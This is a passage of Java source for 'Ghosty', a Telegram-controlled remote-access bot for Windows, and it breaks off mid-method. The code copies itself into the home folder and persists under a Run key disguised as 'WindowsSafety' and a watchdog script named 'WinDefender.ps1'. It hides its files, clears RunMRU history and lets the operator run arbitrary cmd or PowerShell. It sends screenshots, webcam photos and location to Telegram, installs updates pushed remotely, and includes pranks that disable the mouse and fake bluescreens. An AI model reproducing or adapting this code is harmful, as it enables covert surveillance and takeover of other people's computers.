package ProjectX;

import Chat.Client;
import Chat.ClientGUI;
import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import com.sun.management.OperatingSystemMXBean;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jsoup.Jsoup;
import org.jsoup.select.Elements;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.GetFile;
import org.telegram.telegrambots.meta.api.methods.send.SendLocation;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.Document;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.meta.generics.BotSession;


import javax.imageio.ImageIO;
import javax.management.Attribute;
import javax.management.AttributeList;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.text.DateFormat;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.*;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.net.URL;
import java.io.InputStream;

/**
 * Created by Alexander Ressl on 10.04.2017 12:12.
 */
public class Bot extends TelegramLongPollingBot {

    Config config;
    Variables variables;
    Client client;
    boolean writer = false;
    boolean reader = false;
    boolean changed = false;
    boolean changedC = false;
    boolean mute = false;
    String support = "162922263";
    String fun = "DVD open,DVD close,Unclickable,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
    String info = "Screenshot,Uptime,Wer,BatteryInformation,Location,Version,Path,Name,Pic,OperatingSystem,IP,Usage";
    String tools = "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,GhostWriter,Close,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
    public double version = 5.14;
    static private BotSession sup;
    boolean updating = false;
    private long last = System.currentTimeMillis();
    CapsFuck capsFuck = new CapsFuck();
    Thread runfuck = new Thread(capsFuck);
    TaskChecker check = new TaskChecker(this);
    Thread checkrun = new Thread(check);
    LowRam lowRam = new LowRam(last, this);
    Thread run = new Thread(lowRam);
    Thread key = new Thread(new PressKey(this));
    TaskColor color = new TaskColor(this);
    Detect detct = null;
    boolean sicher = false;
    int wo = 0;
    int menu = -1;
    private String time = "";
    boolean shutdown = false;
    boolean restart = false;
    private boolean reset = false;
    private boolean remove = false;
    private SystemTray systemTray;
    private boolean unread = false;
    private ClientGUI chat;
    private boolean silentUpdate = false;
    Map<String, Long> buttons = new HashMap<>();
    boolean hide = false;


    private String changelog = "Audiokeys functional.\n Troll: Unclickable.";

    public Bot(String[] args) {
        config = read();
        variables = readVar();
        this.buttons = variables.getButtons();
        if (buttons == null)
            buttons = new HashMap<>();
        if (this.buttons.size() < 4) {
            for (String put : fun.split(","))
                this.buttons.put(put, 0L);
            for (String put : info.split(","))
                this.buttons.put(put, 0L);
            for (String put : tools.split(","))
                this.buttons.put(put, 0L);
            variables.setButtons(this.buttons);
        }
        if (config.isAlive()) {
            tray();
            key.setDaemon(true);
            key.start();
        }
        if (config.isStartupNotification()) {
            Runtime.getRuntime().addShutdownHook(new Thread() {
                @Override
                public void run() {
                    if (changed)
                        writeConf();
                    DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
                    Date date = new Date();
                    String time = dateFormat.format(date);
                    if (!variables.isSilent())
                        sendNachricht("Ghosty has been shutdown. " + time);
                }
            });
            DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
            Date date = new Date();
            this.time = dateFormat.format(date);
            InetAddress addr;
            String wer = "FEHLER";
            try {
                addr = InetAddress.getLocalHost();
                wer = addr.getHostName();
            } catch (UnknownHostException e) {
                sendNachricht(e.toString());
            }
            if (!variables.isSilent())
                if (args.length == 0)
                    sendNachricht("Device booted!\nTime: " + time + " " + IP.getIP() + "\n" + wer);
                else
                    sendNachricht("Ghosty has been closed unexpectedly! Process restarted successfully.\nTime: " + time + " " + IP.getIP() + "\n" + wer);
        }
        if (!variables.isUpdated()) {
            variables.setUpdated(true);
            tts("Update complete! New Version " + version, false);
            // tts("Ghosty language has been sucessfully changed! HI, i am Zira, your personal assistant! Its a pleasure meeting you. My main task is to keep your system fast and clean. I will only warn you about security breaches and low battery status.");
            sendNachricht("Changelog:\n" + changelog);
            writeConf();
        }
        if (variables.isSilent()) {
            last = variables.lastmil;
            time = variables.time;
            setSilent(false);
        }
        if (variables.isReset()) {
            variables.setReset(false);
            writeConf();
        }
        if (config.isTroll()) {
            runfuck.setDaemon(true);
            runfuck.start();
        }
        run.setDaemon(true);
        run.start();

        String pfad = System.getProperty("user.home") + "\\";
        System.out.println(args.length);
        if (!getPfad().equals(pfad) && args.length == 0) {
            try {
                setSilent(true);
                String name = "Ghosty.jar";
                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass If (Test-Path \"" + pfad + name + "\"){Remove-Item " + pfad + name + "}");
                Thread.sleep(500);
                Process cop = Runtime.getRuntime().exec("cmd /c copy /v/y \"" + getAbsolutePfad() + "\" \"" + pfad + "\"");
                cop.waitFor();
                Process ren = Runtime.getRuntime().exec("cmd /c rename \"" + pfad + getName() + "\" " + name);
                ren.waitFor();
                Runtime.getRuntime().exec("cmd /c start \"Windows\" \"" + pfad + name + "\"");
                Thread.sleep(1000);
                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
                deleteme();
            } catch (Exception e) {
                System.out.println(e);
            }
        } else {
            if (args.length == 0 && config.isUnkillable()) {
                try {
                    String command =
                            "while($true){\n" +
                                    "    Sleep 10\n" +
                                    "    $java = Get-Process javaw -ErrorAction SilentlyContinue\n" +
                                    "    if(!$java){\n" +
                                    "        Start-Process \"" + getPfad() + getName() + "\" -ArgumentList restart\n" +
                                    "        Sleep 50\n" +
                                    "    }\n" +
                                    "}";
                    File file = File.createTempFile("WinDefender", ".ps1");
                    FileWriter fw = new java.io.FileWriter(file);
                    fw.write(command);
                    fw.close();
                    Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"" + file.getPath() + "\"");
                    file.deleteOnExit();
                } catch (Exception e) {
                    sendNachricht("Fehler beim Restart Script.");
                }
            }
            if (config.isAutostart())
                try {
                    Reg.writeStringValue(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety", getAbsolutePfad());
                } catch (Exception e) {
                    sendNachricht(e.toString());
                }
            if (config.isTaskhide()) {
                checkrun.setDaemon(true);
                checkrun.start();
            }
            try {
                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\conf.bot" + "\"");
            } catch (IOException ek) {
                System.out.println(ek + " HIDE");
            }
            try {
                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\var.bot" + "\"");
            } catch (IOException ek) {
                System.out.println(ek + " HIDE");
            }
            if (config.isHidden()) {
                hide();
            }
            try {
                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
            } catch (IOException e) {
                System.out.println(e);
            }
        }
        String text;
        if (variables.isMute())
            text = "Unmute";
        else
            text = "Mute";
        if (config.isAlive())
            systemTray.getTrayIcons()[0].getPopupMenu().getItem(5).setLabel(text);
        if (config.isAntiAV())
            chat = new ClientGUI("piboti.zapto.org", 4269, this);
    }


    private Config read() {
        Config back = null;
        try {
            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\conf.bot");
            ObjectInputStream ois = new ObjectInputStream(fis);
            back = (Config) ois.readObject();
            ois.close();
        } catch (Exception e) {
            System.out.println(e);
        }
        return back;
    }

    private Variables readVar() {
        Variables back = null;
        try {
            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\var.bot");
            ObjectInputStream ois = new ObjectInputStream(fis);
            back = (Variables) ois.readObject();
            ois.close();
        } catch (Exception e) {
            System.out.println(e);
        }
        if (back == null) {
            System.out.println("Hier da");
            back = new Variables();
        }
        return back;
    }

    @Override
    public void onUpdateReceived(Update update) {
        if (!update.hasMessage())
            return;
        long userid = update.getMessage().getFrom().getId();
        if (userid != Integer.parseInt(config.getAdmin()) && userid != Integer.parseInt(support))
            return;
        if (updating)
            return;
        if (update.getMessage().hasDocument()) {
            updating = true;
            setImage(1);
            sendNachrichtAdmin("Update detected!");
            if (silentUpdate)
                sendNachrichtAdmin("SilentMode enabled!");
            else {
                sendNachricht("Updating!\nPlease do not turn off your device in the next minute.");
                tts("Update detected! Please do not turn off your device in the next minute.", false);
            }
            try {
                GetFile n = new GetFile();
                n.setFileId(update.getMessage().getDocument().getFileId());
                org.telegram.telegrambots.meta.api.objects.File bl = execute(n);
                java.io.File fileFromSystem = downloadFile(bl.getFilePath());
                String pfad = System.getProperty("user.home") + "\\IO.jar";
                Files.move(fileFromSystem.toPath(), (new java.io.File(pfad)).toPath(), StandardCopyOption.REPLACE_EXISTING);
                sendNachrichtAdmin("Update done!");
                File datei = new File(pfad);
                update(datei);
            } catch (Exception e) {
                sendNachrichtAdmin(e.toString());
                setImage(3);
                if (variables.isSilent())
                    sendNachrichtAdmin("Update failed!");
                else
                    sendNachricht("Update failed!");
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e1) {
                }
                updating = false;
                if (!color.isActive()) {
                    Thread up = new Thread(color);
                    up.start();
                } else
                    color.setRunning(true);
            }
        }
        if (!update.getMessage().hasText())
            return;
        long elapsedTimeMillis = System.currentTimeMillis() - last;
        float elapsedTimeMin = elapsedTimeMillis / (60 * 1000F);
        String nachricht = update.getMessage().getText();
        if (userid == Integer.parseInt(support) && !support.equalsIgnoreCase(config.getAdmin())) {
            if (nachricht.equalsIgnoreCase("Silent")) {
                sendNachrichtAdmin("SilentMode activated!");
                silentUpdate = true;
            } else
                sendNachrichtAdmin("Version: " + version);
            return;
        }
        setImage(2);
        if (!color.isActive()) {
            Thread up = new Thread(color);
            up.start();
        } else
            color.setRunning(true);

        //ANFANGEN MIT HANDLEN


        String[] parts = nachricht.split("\\s+");
        for (String item : parts)
            if (isValidURL(item))
                try {
                    Runtime.getRuntime().exec("cmd /c start " + item);
                    sendNachricht("Opening website.");
                } catch (IOException e) {
                }

        if (tools.toLowerCase().contains(nachricht.toLowerCase()) || info.toLowerCase().contains(nachricht.toLowerCase()) || fun.toLowerCase().contains(nachricht.toLowerCase())) {
            try {
                if (this.buttons.containsKey(nachricht))
                    this.buttons.put(nachricht, buttons.get(nachricht) + 1);
                else
                    this.buttons.put(nachricht, 1L);
                changed = true;
            } catch (NullPointerException ignored) {
            }
        }
        //<editor-fold desc="Shutdown Restart reset close">
        if (shutdown) {
            shutdown = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                try {
                    String shutdownCommand;
                    String operatingSystem = System.getProperty("os.name");
                    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
                        shutdownCommand = "shutdown -h now";
                    } else if (operatingSystem.contains("Windows")) {
                        shutdownCommand = "shutdown.exe -s -t 0";
                    } else {
                        throw new RuntimeException("Unsupported operating system.");
                    }
                    sendNachricht("PC turned off.");
                    Runtime.getRuntime().exec(shutdownCommand);
                    System.exit(0);
                } catch (Exception e) {
                    sendNachricht("Error unable to turn device off.");
                }
            else {
                menu = -1;
                sendNachricht("Shutdown canceled!");
            }
        }
        if (nachricht.equalsIgnoreCase("shutdown")) {
            shutdown = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you wanna turn off the device?");
        }
        if (restart) {
            restart = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                try {
                    String shutdownCommand;
                    String operatingSystem = System.getProperty("os.name");
                    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
                        shutdownCommand = "shutdown -r now";
                    } else if (operatingSystem.contains("Windows")) {
                        shutdownCommand = "shutdown.exe -r -t 0";
                    } else {
                        throw new RuntimeException("Unsupported operating system.");
                    }
                    sendNachricht("PC is restarting!");
                    Runtime.getRuntime().exec(shutdownCommand);
                    System.exit(0);
                } catch (Exception e) {
                    sendNachrichtAdmin("FEHLER BEIM BEENDEN DES PC's!");
                }
            else {
                menu = -1;
                sendNachricht("Restarting canceled.");
            }
        }
        if (nachricht.equalsIgnoreCase("restart")) {
            restart = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you wanna reboot the device?");
        }
        if (nachricht.equalsIgnoreCase("startWriting")) {
            changeWriting();
        }
        if (nachricht.equalsIgnoreCase("GhostWriter")) {
            reader = !isReading();
            if (reader)
                sendNachricht("You are now a GhostWriter!");
            else
                sendNachricht("You are no longer a GhostWriter!");
        }
        if (nachricht.toLowerCase().contains("powershell")) {
            String code;
            if (nachricht.equalsIgnoreCase("powershell")) {
                try {
                    Runtime.getRuntime().exec("powershell.exe");
                } catch (Exception e) {
                    sendNachrichtAdmin("Powershell konnte nicht gestartet werden!");
                }
            } else {
                code = nachricht.split(":")[1];
                code = code.replace(":", "");
                try {
                    Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass " + code);
                } catch (Exception e) {
                    sendNachrichtAdmin("Powershell konnte nicht gestartet werden!");
                }
            }
        }
        if (reset) {
            reset = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                reset();
            else {
                menu = -1;
                sendNachricht("Reset canceled");
            }
        }
        if (nachricht.equalsIgnoreCase("BotReset")) {
            reset = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you really want to reset Ghosty?");
        }
        //TODO CLOSE GEHT NICHT
        if (sicher) {
            sicher = false;
            if (nachricht.equalsIgnoreCase("Yes")) {
                try {
                    Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
                } catch (IOException e) {
                    e.printStackTrace();
                }
                System.exit(0);
            } else {
                menu = -1;
                sendNachricht("Closing canceled");
            }
        }
        if (nachricht.equalsIgnoreCase("close")) {
            sicher = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you wanna close Ghosty?");
        }
        if (nachricht.equalsIgnoreCase("retry")) {
            sendNachricht("Restarting. . .");
            retry();
        }
        //</editor-fold>

        //<editor-fold desc="Basic Menu Commands">
        if (nachricht.equalsIgnoreCase("menu")) {
            wo = 0;
            menu = -1;
            sendNachricht("Menu.");
        }
        if (nachricht.equalsIgnoreCase("leave")) {
            wo = 0;
            menu = -1;
            sendNachricht("Going back.");
        }
        if (nachricht.equalsIgnoreCase("fun") && config.isTroll()) {
            wo = 0;
            menu = 0;
            sendNachricht("Fun Menu.");
        }
        if (nachricht.equalsIgnoreCase("info")) {
            wo = 0;
            menu = 1;
            sendNachricht("Info menu.");
        }
        if (nachricht.equalsIgnoreCase("Tools")) {
            wo = 0;
            menu = 2;
            sendNachricht("Tool menu.");
        }
        if (nachricht.equalsIgnoreCase("Music")) {
            wo = 0;
            menu = 3;
            sendNachricht("Music");
        }
        if (nachricht.equalsIgnoreCase("forward")) {
            wo++;
            sendNachricht("Next Page.");
        }
        if (nachricht.equalsIgnoreCase("back") && wo > 0) {
            wo--;
            sendNachricht("Previous Page.");
        }
        //</editor-fold>

        //<editor-fold desc="Troll">
        if (config.isTroll()) {
            if (nachricht.equalsIgnoreCase("DVD open")) {
                CDUtils.open();
                sendNachricht("DVD drive closing!");
            }
            if (nachricht.equalsIgnoreCase("DVD close")) {
                CDUtils.close();
                sendNachricht("DVD drive opening!");
            }
            if (nachricht.equalsIgnoreCase("Caps Fucker")) {
                if (capsFuck.isCapsfuck())
                    sendNachricht("Caps-Lock is working again.");
                else
                    sendNachricht("Caps-Lock malfunction.");
                capsFuck.setCapsfuck(!capsFuck.isCapsfuck());
            }

            if (nachricht.equalsIgnoreCase("Windows Fucker")) {
                if (capsFuck.isWindowsfucker())
                    sendNachricht("Windows Key funktioniert wieder.");
                else
                    sendNachricht("Windows Key Fehlfunktion.");
                capsFuck.setWindowsfucker(!capsFuck.isWindowsfucker());
            }
            if (nachricht.equalsIgnoreCase("Mouse Fucker")) {
                if (capsFuck.isMousefucker())
                    sendNachricht("Maus wieder einsatzfähig.");
                else
                    sendNachricht("Maus defekt!");
                capsFuck.setMousefucker(!capsFuck.isMousefucker());

            }

            if (nachricht.equalsIgnoreCase("Screen fucker")) {
                capsFuck.setScreenfucker(!capsFuck.isScreenfucker());
                if (!capsFuck.isScreenfucker()) {
                    sendNachricht("Bildschirm wieder in Ordnung.");
                } else {
                    sendNachricht("RGB Test aktiviert.");
                }
            }
            if (nachricht.equalsIgnoreCase("unclickable")) {
                if (Draw.active) {
                    sendNachricht("Clickable!");
                    Draw.stop();
                } else {
                    sendNachricht("Not Clickable :(");
                    Draw.unclickable();
                }
            }
            if (nachricht.equalsIgnoreCase("All fucker")) {
                capsFuck.setAllfuck(!capsFuck.isAllfuck());
                if (!capsFuck.isAllfuck()) {
                    Draw.stop();
                    sendNachricht("Alles wieder normal :(");
                } else {
                    Draw.screenfucker();
                    sendNachricht("Jetzt ist es aus dam dam");
                }

            }
            if (nachricht.equalsIgnoreCase("nobrain")) {
                try {
                    sendNachricht("Oh nette website.");
                    Runtime.getRuntime().exec("cmd /c start iexplore www.nobrain.dk");
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (nachricht.equalsIgnoreCase("Strange")) {
                if (Draw.active) {
                    sendNachricht("Strange fertig!");
                    Draw.stop();
                } else {
                    sendNachricht("Strange!");
                    Draw.screenfucker();
                }
            }
            if (nachricht.equalsIgnoreCase("Dog cleaner")) {
                if (Draw.active) {
                    sendNachricht("Hund fertig!");
                    Draw.stop();
                } else {
                    sendNachricht("Hund fängt an!");
                    Draw.dog();
                }
            }
            if (nachricht.equalsIgnoreCase("walk")) {
                if (Draw.active) {
                    sendNachricht("Fertig gegangen!");
                    Draw.stop();
                } else {
                    sendNachricht("Ich gehe los!");
                    Draw.walk();
                }
            }
            if (nachricht.equalsIgnoreCase("scare")) {
                if (Draw.active) {
                    sendNachricht("Fertig gescared!");
                    Draw.stop();
                } else {
                    sendNachricht("Scare!");
                    Draw.scare();
                }
            }
            if (nachricht.equalsIgnoreCase("bluescreen")) {
                System.out.println("Bluescreening");
                if (Draw.active) {
                    sendNachricht("Bluescreen entfernt!");
                    Draw.stop();
                } else {
                    sendNachricht("Gebluescreent!");
                    Draw.blue();
                }
            }
        }
        //</editor-fold>

        //<editor-fold desc="Tools">
        if (nachricht.equalsIgnoreCase("lock")) {
            try {
                Runtime.getRuntime().exec("C:\\Windows\\System32\\rundll32.exe user32.dll,LockWorkStation");
            } catch (IOException e) {
                e.printStackTrace();
            }
            sendNachricht("Device locked!");
        }
        if (nachricht.equalsIgnoreCase("ChangePW")) {
            sendNachricht("Please enter you new password on the device.");
            JPanel panel = new JPanel();
            JLabel label = new JLabel("Please enter your new password:");
            JPasswordField pass = new JPasswordField(10);
            JPasswordField pass1 = new JPasswordField(10);
            panel.add(label);
            panel.add(pass);
            panel.add(pass1);
            panel.grabFocus();
            String[] options = new String[]{"OK", "Cancel"};
            int option = JOptionPane.showOptionDialog(null, panel, "Password",
                    JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
                    null, options, options[0]);
            if (option == 0) // pressing OK button
            {
                char[] password = pass.getPassword();
                char[] password1 = pass1.getPassword();
                String pw = new String(password);
                String pw1 = new String(password1);
                if (pw.equals(pw1)) {
                    config.setPassword(pw);
                    sendNachricht("Password set!");
                    changedC = true;
                } else {
                    sendNachricht("Passwords do not match!");
                }
            }
        }
        if (nachricht.toLowerCase().contains("cmd")) {
            String code;
            if (nachricht.equalsIgnoreCase("cmd")) {
                try {
                    Runtime.getRuntime().exec("cmd /c start");
                } catch (Exception e) {
                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
                }
            } else {
                code = nachricht.split(":")[1];
                code = code.replace(":", "");
                try {
                    Runtime.getRuntime().exec("cmd /c " + code);
                } catch (Exception e) {
                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
                }
            }
        }

        if (nachricht.equalsIgnoreCase("Black")) {
            try {
                String command =
                        "Add-Type -TypeDefinition '\n" +
                                "using System;\n" +
                                "using System.Runtime.InteropServices;\n" +
                                " \n" +
                                "namespace Utilities {\n" +
                                "   public static class Display\n" +
                                "   {\n" +
                                "      [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]\n" +
                                "      private static extern IntPtr SendMessage(\n" +
                                "         IntPtr hWnd,\n" +
                                "         UInt32 Msg,\n" +
                                "         IntPtr wParam,\n" +
                                "         IntPtr lParam\n" +
                                "      );\n" +
                                " \n" +
                                "      public static void PowerOff ()\n" +
                                "      {\n" +
                                "         SendMessage(\n" +
                                "            (IntPtr)0xffff, // HWND_BROADCAST\n" +
                                "            0x0112,         // WM_SYSCOMMAND\n" +
                                "            (IntPtr)0xf170, // SC_MONITORPOWER\n" +
                                "            (IntPtr)0x0002  // POWER_OFF\n" +
                                "         );\n" +
                                "      }\n" +
                                "   }\n" +
                                "}\n" +
                                "'\n" +
                                "[Utilities.Display]::PowerOff()";
                File file = File.createTempFile("WinBlack", ".ps1");
                FileWriter fw = new java.io.FileWriter(file);
                fw.write(command);
                fw.close();
                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"" + file.getPath() + "\"");
                Thread.sleep(1000);
                file.delete();
                sendNachricht("Display has been turned off.");
            } catch (Exception e) {
                sendNachricht("Fehler beim Bildschirm abdrehen.");
            }
        }

        if (nachricht.equalsIgnoreCase("autostart") && config.isAutostart()) {
            try {
                Reg.writeStringValue(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety", getAbsolutePfad());
            } catch (Exception e) {
                sendNachrichtAdmin(e.toString());
            }
        }
        if (remove) {
            remove = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                panic();
            else {
                menu = -1;
                sendNachricht("Deinstallation abgebrochen");
            }
        }
        if (nachricht.equalsIgnoreCase("Uninstall")) {
            remove = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you with to uninstall?");
        }
        if (nachricht.equalsIgnoreCase("alarm")) {
            AlertMode(0);
        }
        if (nachricht.equalsIgnoreCase("autolock")) {
            AlertMode(1);
        }

        if (nachricht.equalsIgnoreCase("sleep")) {
            try {
                Runtime.getRuntime().exec("Rundll32.exe powrprof.dll,SetSuspendState Sleep");
            } catch (IOException e) {
                sendNachricht(e.toString());
            }
        }
        if (nachricht.equalsIgnoreCase("tarn")) {
            if (config.isTaskhide())
                tarnung();
            else
                sendNachricht("TaskHide has been disabled in the settings. ");
        }
        if (nachricht.equalsIgnoreCase("Down")) {
            audioChange(-0.02);
            sendNachricht("Lautstärke verringert.");
        }

        if (nachricht.equalsIgnoreCase("Un-/Mute")) {
            /*
            try {
                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]173)");
            } catch (Exception e) {
                sendNachricht("Fehler beim muten.");
            }
            */
            mute = !mute;
            audioMute(mute);
            sendNachricht("Gemutet oder entmutet.");
        }
        if (nachricht.equalsIgnoreCase("Up")) {
            audioChange(0.02);
            sendNachricht("Volume increased.");
        }

        if (nachricht.equalsIgnoreCase("Previous")) {
            try {
                GlobalScreen.postNativeEvent(new NativeKeyEvent(2401, 0, 177, 57360, org.jnativehook.keyboard.NativeKeyEvent.CHAR_UNDEFINED));
            } catch (Exception e) {
                sendNachricht("Fehler beim zurückspulen.");
            }
            sendNachricht("Vorheriges Lied.");
        }
        if (nachricht.equalsIgnoreCase("Play/Pause")) {
            try {
                GlobalScreen.postNativeEvent(new NativeKeyEvent(2401, 0, 179, 57378, org.jnativehook.keyboard.NativeKeyEvent.CHAR_UNDEFINED));
            } catch (Exception e) {
                sendNachricht("Fehler bei play/pause.");
            }
            sendNachricht("Play oder Pause.");
        }
        if (nachricht.equalsIgnoreCase("next")) {
            try {
                GlobalScreen.postNativeEvent(new NativeKeyEvent(2401, 0, 176, 57369, org.jnativehook.keyboard.NativeKeyEvent.CHAR_UNDEFINED));
            } catch (Exception e) {
                sendNachricht("Fehler beim nächsten Lied.");
            }
            sendNachricht("Nächstes Lied.");
        }
        //</editor-fold>

        //<editor-fold desc="Info">
        if (nachricht.equalsIgnoreCase("location")) {
            float lat = 0;
            float lon = 0;
            try {
                org.jsoup.nodes.Document doc = Jsoup.connect("http://ipinfo.io/").get();
                Elements bl = doc.select("tr");
                String[] beide = bl.get(2).getAllElements().get(2).text().split(",");
                lat = Float.parseFloat(beide[0]);
                lon = Float.parseFloat(beide[1]);
            } catch (Exception e) {
                System.out.println(e.toString());
            }

            /*
            try {
                org.jsoup.nodes.Document doc = Jsoup.connect("https://www.google.at/search?q=where+am+i").get();
                Elements bl = doc.select(".lu_map_section > a");
                String blub = (bl.get(0).getAllElements().get(0).getAllElements().get(0)).toString();
                String genauer = blub.substring(blub.indexOf("href") + 6, blub.indexOf("tabindex") - 2);
                sendNachricht("www.google.at" + genauer);
            } catch (Exception e) {
                System.out.println(e.toString());
            }
            */
            if (lat == 0 && lon == 0)
                sendNachricht("Fehler beim Orten.");
            else
                sendLocation(lat, lon);

        }

        if (nachricht.equalsIgnoreCase("usage")) {
            double usage = getProcessCpuLoad(0);
            int ram = getRamLoad();
            sendNachricht("Usage:\nRAM: " + ram + "%\nCPU: " + usage + "%");
        }
        if (nachricht.equalsIgnoreCase("path")) {
            sendNachricht(getPfad());
        }
        if (nachricht.equalsIgnoreCase("name")) {
            sendNachricht(getName());
        }
        if (nachricht.equalsIgnoreCase("OperatingSystem")) {
            sendNachricht(System.getProperty("os.name"));
        }
        if (nachricht.equalsIgnoreCase("pic")) {
            if (config.isCamera())
                takepic(false);
            else
                sendNachricht("Camera has been disabled in the settings.");
        }


        if (nachricht.equalsIgnoreCase("BatteryInformation")) {
            Kernel32.SYSTEM_POWER_STATUS batteryStatus = new Kernel32.SYSTEM_POWER_STATUS();
            Kernel32.INSTANCE.GetSystemPowerStatus(batteryStatus);
            sendNachricht(batteryStatus.toString());
        }
        if (nachricht.equalsIgnoreCase("hide")) {
            File me = new File(this.getAbsolutePfad());
            sendNachricht(me.isHidden() + " -- suppose " + config.isHidden());
        }
        if (nachricht.equalsIgnoreCase("screenshot")) {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();
            Rectangle allScreenBounds = new Rectangle();
            for (GraphicsDevice screen : screens) {
                Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
                allScreenBounds.width += screenBounds.width;
                allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
            }
            try {
                Robot robot = new Robot();
                BufferedImage screenShot = robot.createScreenCapture(allScreenBounds);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(screenShot, "png", baos);
                //ImageIO.write(webcam.getImage(), "png", pic);
                InputStream is = new ByteArrayInputStream(baos.toByteArray());
                sendStream(is);
                /*File send = new File(System.getProperty("user.home") + "\\Pic.jpg");
                if (send.exists())
                    send.delete();
                ImageIO.write(screenShot, "JPG", send);

                Thread.sleep(100);
                sendPic(send);
                Thread.sleep(100);
                send.delete();
                */
            } catch (Exception e) {
                sendNachrichtAdmin(e.toString() + "\nBeim erstellen");
            }
        }
        if (nachricht.equalsIgnoreCase("Uptime")) {
            sendNachricht("Device is still running!\nTime running: " + (int) elapsedTimeMin / 60 + " h : " + (int) elapsedTimeMin % 60 + " m!\nSince: " + time);
        }
        if (nachricht.equalsIgnoreCase("wer")) {
            try {
                InetAddress addr;
                addr = InetAddress.getLocalHost();
                sendNachricht(addr.getHostName());
            } catch (Exception e) {
                sendNachricht("Es gibt keinen Nutzer.");
            }
        }
        if (nachricht.equalsIgnoreCase("IP")) {
            sendNachricht(IP.getIP());
        }
        if (nachricht.equalsIgnoreCase("version")) {
            sendNachricht("Version: " + version);
        }

        if (nachricht.equalsIgnoreCase("dir")) {
            try {
                File folder = new File(getPfad());
                File[] listOfFiles = folder.listFiles();
                sendNachricht(getPfad());
                sendNachricht(listOfFiles.length + "");
                for (int i = 0; i < listOfFiles.length; i++) {
                    if (listOfFiles[i].isFile()) {
                        sendNachricht("File " + listOfFiles[i].getName());
                    } else if (listOfFiles[i].isDirectory()) {
                        sendNachricht("Directory " + listOfFiles[i].getName());
                    }
                }
            } catch (Exception ex) {
                sendNachricht("Fuck\n" + ex);
            }
        }
        //</editor-fold>

        if (nachricht.toLowerCase().contains("sag:"))
            tts(nachricht.split(":")[1], true);
        if (nachricht.toLowerCase().contains("say:"))
            tts(nachricht.split(":")[1], false);
        if (menu == 0 && !config.isTroll()) {
            wo = 0;
            sendNachricht("Troll function have been deactivated in the Ghosty Settings.");
        }
    }

    public void AlertMode(int wasmachen) {

        if (detct != null && detct.isRunning()) {
            if (wasmachen == 0)
                sendNachricht("Alarm disabled!");
            else
                sendNachricht("Autolock disabled!");
            detct.setRunning(false);
        } else {
            if (wasmachen == 0)
